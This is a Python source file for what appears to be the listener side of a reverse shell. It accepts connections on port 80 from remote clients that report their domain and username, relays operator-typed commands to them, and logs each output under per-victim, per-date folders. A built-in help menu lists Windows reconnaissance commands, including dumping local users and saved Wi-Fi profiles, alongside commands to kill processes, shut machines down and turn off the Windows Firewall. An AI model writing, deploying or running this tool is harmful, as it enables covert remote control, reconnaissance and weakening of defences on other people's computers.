import socket
import os
from datetime import datetime, timezone

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('', 80))
    server_socket.listen(5)
    print("Server started and waiting for connections...")
    try:
        accepting_connections = True        
        while accepting_connections:
            client_socket, addr = server_socket.accept()
            print(f"Connection from {addr} has been established")
            username = client_socket.recv(1024).decode()
            if '/' in username:
                domain, username = username.split('/', 1)
            else:
                domain = 'LOCAL'
            print(f"Domain : {domain}, User : {username}")
            user_dir = f"./{username}"
            os.makedirs(user_dir, exist_ok=True)
            current_date = datetime.now(timezone.utc).strftime('%Y-%m-%d')
            date_dir = os.path.join(user_dir, current_date)
            os.makedirs(date_dir, exist_ok=True)
            current_time = datetime.now(timezone.utc).strftime('%H-%M-%S')
            time_dir = os.path.join(date_dir, current_time)
            os.makedirs(time_dir, exist_ok=True)
            while True:
                command = input("Enter command to execute : ")
                if command.lower() in ['q', 'e', 'quit', 'exit']:
                    client_socket.send(b"EXIT")
                    print("Exit signal sent to client.")
                    client_socket.close()
                    print("Client connection closed.")
                    accepting_connections = False
                    server_socket.close()
                    print("Server has closed its connection to the proxy.")
                    break
                elif command.lower() == 'help':
                    help_text = """
               ╔═════════════════════╗
               ║   SYSTEM COMMANDS   ║
               ╚═════════════════════╝

whoami                      : Displays the current username and hostname.
systeminfo                  : Displays detailed system information.
dir                         : Lists files in the current directory.
dir [directory]             : Lists files in the specified directory.
cd [directory]              : Changes the directory to the specified path.
echo %cd%                   : Displays the current working directory.
type [filename]             : Outputs the contents of a specified file.
copy [file] [destination]   : Copies a specified file to the destination.
net user                    : Lists all local user accounts on the system.
tasklist                    : Displays a list of currently running processes.
taskkill /IM [processname]  : Terminates a process by its name.
taskkill /PID [processID]   : Terminates a process by its ID.
chkdsk [drive:]             : Checks the file system and disk for errors.
shutdown /s                 : Shuts down the computer.
shutdown /r                 : Restarts the computer.

               ╔══════════════════════╗
               ║   NETWORK COMMANDS   ║
               ╚══════════════════════╝

ipconfig /all                                   : Displays all TCP/IP network configuration details.
netstat -a                                      : Displays all active connections and listening ports.
arp -a                                          : Displays the ARP cache, showing IP to MAC mappings.
netsh interface show interface                  : Displays a list of all network interfaces.
getmac                                          : Shows the MAC address of the local system.
netsh wlan show profiles                        : Displays saved Wi-Fi profiles on the computer.
nbtstat -n                                      : Shows NetBIOS over TCP/IP statistics.
hostname                                        : Shows the computer's hostname.
ipconfig /flushdns                              : Clears the DNS resolver cache.
net view \\\\server                               : Shows shared resources on a specified server.
netsh advfirewall set allprofiles state off     : Turns off the Windows Firewall for all profiles.

"""
                    print(help_text.center(80))
                    continue
                client_socket.send(command.encode())
                output = client_socket.recv(4096).decode()
                if not output:
                    print("No output received. The command may have opened an application.")
                else:
                    current_utc_time = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
                    command_file = os.path.join(time_dir, f"{command}.txt")
                    with open(command_file, 'w') as f:
                        f.write(f"Date : {current_date}\n")
                        f.write(f"UTC Time : {current_utc_time}\n")
                        f.write(output)
                    print(f"Output :\n{output}")
    except Exception as e:
        print(f"Error : {e}")
    finally:
        server_socket.close()
        print("Server socket closed.")

if __name__ == "__main__":
    start_server()